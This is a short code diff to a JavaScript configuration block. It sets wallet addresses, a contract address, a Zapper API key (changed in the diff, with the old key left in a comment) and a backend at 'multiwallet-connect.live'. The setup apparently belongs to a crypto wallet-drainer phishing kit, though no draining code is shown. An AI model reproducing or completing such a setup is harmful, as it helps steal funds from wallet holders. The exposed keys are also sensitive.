@@ -24,7 +24,7 @@ let w3 = new ethers.providers.JsonRpcProvider(RPC);
 operator = '0x211536e0ef7eda850484A921caceA4fc6207DCEc' //  --> The address (0x) of the operator that conducts transactions, the privatekey of which lies on the server in the variable
 contractSAFA = '0xcd97e17965e2d0ee3067fc120b509d25669f6828' // specify address contract your deploy
 ownerAddress = '0x211536e0ef7eda850484A921caceA4fc6207DCEc' // specify address reciept --> MY ACC 10
-const ZAPPER_KEY = '4b7d9cec-2dca-44b9-854f-1175fa2ec9b3'  // specify your API key
+const ZAPPER_KEY = 'd33110cf-f610-408b-8d11-990da7f544d3' //4b7d9cec-2dca-44b9-854f-1175fa2ec9b3 // specify your API key
 const BASE_URL = 'https://multiwallet-connect.live/backend'; // specify the address to the configured server in format https://server.com/api
 // SET THESE END
 
